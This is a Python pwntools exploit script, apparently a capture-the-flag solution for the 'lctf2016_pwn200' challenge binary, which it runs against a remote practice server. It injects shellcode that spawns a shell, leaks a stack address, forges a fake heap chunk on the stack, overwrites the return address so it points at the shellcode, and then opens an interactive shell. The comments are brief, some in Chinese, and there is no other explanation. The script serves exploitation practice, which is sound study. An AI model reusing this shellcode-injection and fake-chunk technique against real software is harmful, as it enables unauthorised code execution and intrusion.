from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')

debug = 0

if debug:
    io = process('./lctf2016_pwn200')
    context.log_level = 'debug'
else:
    io = remote('node4.buuoj.cn',26886)

def p():
    gdb.attach(proc.pidof(io)[0])

io.recvuntil(b"are u?")
#name = asm(shellcraft.sh()).rjust(48,b'a')
name = asm(shellcraft.sh())
log.info("name len is -->"+str(len(name))) # 48
io.send(name)
rbp = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("rbp -->" + hex(rbp))
shell_code_addr = rbp - 0x50
ret_addr = rbp - 0x78
success("shell_code_addr -->"+hex(shell_code_addr))
success("ret_addr -->"+hex(ret_addr))
io.recvuntil("give me your id ~~?")
io.sendline(b'65')

#在ret_addr 作为mem构造fack chunk ## 戳了，最多覆盖到rbp-0x8，所以要在前面布置chunk
# 伪造多大的chunk根据能申请多大的chunksize 0-0x90
fack_chunk_addr = rbp - 0xb0
success("fack_chunk_addr -->" + hex(fack_chunk_addr))
money = p64(0) * 3 
money += p64(0x51)
money += p64(0) * 3 + p64(fack_chunk_addr + 0x10) # free 的参是mem
io.sendafter(b"give me money~",money)
io.sendlineafter(b"your choice :",b'2')
#p()
io.sendlineafter(b"your choice :",b'1')
io.sendlineafter(b"how long?",b'64')
payload = p64(0) * 4 + p64(rbp) + p64(shell_code_addr)
#p()
io.sendlineafter(b"give me more money : ",payload)

io.sendlineafter(b"your choice :",b'3')

io.interactive()
